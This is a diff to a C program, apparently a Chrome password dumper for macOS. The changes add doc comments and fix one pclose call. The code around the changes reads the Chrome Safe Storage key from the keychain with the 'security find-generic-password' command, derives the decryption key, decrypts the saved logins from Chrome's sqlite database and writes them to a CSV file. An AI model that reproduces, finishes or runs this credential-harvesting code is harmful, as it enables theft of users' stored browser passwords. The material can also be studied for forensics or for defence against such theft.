@@ -13,6 +13,11 @@ struct user_info {
     char * password;
 };
 
+/**
+ * @param out
+ *
+ * Allow to get Chrome secure keychain
+ */
 void safe_chrome_secure(char * out)
 {
     FILE * fsecure = popen("security find-generic-password -wa 'Chrome'", "r");
@@ -24,6 +29,12 @@ void safe_chrome_secure(char * out)
     pclose(fsecure);
 }
 
+/**
+ * @param out
+ *
+ * Allow to get key for decrypt password.
+ * This program use a python script to use pbkdf2_hmac encryption
+ */
 void pbkdf2_hmac(char * out)
 {
     char key_storage[256];
@@ -40,10 +51,16 @@ void pbkdf2_hmac(char * out)
     }
 
     strcpy(out, buffer);
-    pclose(buffer);
+    pclose(f_pbkdf2_hmac);
 
 }
 
+/**
+ * @param out
+ * @param encoded
+ *
+ * Allow to encode value encoded to base64
+ */
 void base64(char * out, char * encoded)
 {
     char encbase64[256];
@@ -60,6 +77,13 @@ void base64(char * out, char * encoded)
     pclose(fbase64);
 }
 
+/**
+ * @param out
+ * @param encoded password
+ * @param key
+ *
+ * Allow to decrypt chrome password
+ */
 void chrome_decript(char * out, char * encoded, char * key)
 {
     char * iv = "20202020202020202020202020202020";
@@ -83,7 +107,11 @@ void chrome_decript(char * out, char * encoded, char * key)
     pclose(fdecrypt);
 }
 
-// Adding line to the CSV File
+/**
+ * @param parent_
+ *
+ * Allow to adding line to the CSV File
+ */
 static void save_data(struct user_info *parent_)
 {
     char *filename = "Chrome_data.csv";
@@ -116,7 +144,17 @@ static void save_data(struct user_info *parent_)
     flock(fp, LOCK_UN);
 }
 
-
+/**
+ * @param data
+ * @param argc
+ * @param argv
+ * @param azColName
+ *
+ * @return int
+ *
+ * Callback for sqlite_exec
+ * Get row in tables login
+ */
 static int callback(void * data, int argc, char **argv, char **azColName)
 {
     struct user_info * parent_;
@@ -165,6 +203,11 @@ static int callback(void * data, int argc, char **argv, char **azColName)
     return 0;
 }
 
+
+/**
+ * Main programm
+ * @return SUCCESS Or FAILURE
+ */
 int main()
 {
     sqlite3 * db;
